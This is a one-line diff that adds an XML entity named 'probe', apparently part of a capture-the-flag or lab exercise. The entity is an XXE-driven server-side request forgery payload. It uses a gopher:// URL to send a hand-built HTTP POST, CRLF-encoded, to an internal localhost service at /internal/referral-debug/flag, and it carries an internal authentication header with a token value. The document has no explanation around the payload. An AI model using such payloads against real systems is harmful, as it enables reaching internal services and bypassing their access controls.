@@ -1,0 +1,1 @@
+<!ENTITY probe "gopher://127.0.0.1:7777/_POST&#x25;20/internal/referral-debug/flag&#x25;20HTTP/1.1&#x25;0D&#x25;0AHost:&#x25;20127.0.0.1:7777&#x25;0D&#x25;0AX-Ntnx-Internal-Auth:&#x25;20e47527fc-b91b-46a1-8ce3-54a918c6afbe&#x25;0D&#x25;0AContent-Length:&#x25;200&#x25;0D&#x25;0AConnection:&#x25;20close&#x25;0D&#x25;0A&#x25;0D&#x25;0A">
